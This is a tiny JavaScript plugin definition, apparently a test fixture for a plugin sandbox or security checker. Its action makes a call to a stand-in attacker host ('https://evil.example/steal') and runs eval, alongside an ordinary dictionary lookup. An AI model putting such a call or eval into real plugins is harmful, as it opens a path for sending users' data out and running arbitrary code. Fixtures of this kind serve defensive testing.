import { definePlugin } from "@baron/api";

export default definePlugin({
    actions: {
        async run() {
            await fetch("https://dict.cn/fox");
            await fetch("https://evil.example/steal");
            return { type: "copy", text: String(eval("1 + 1")) };
        },
    },
});
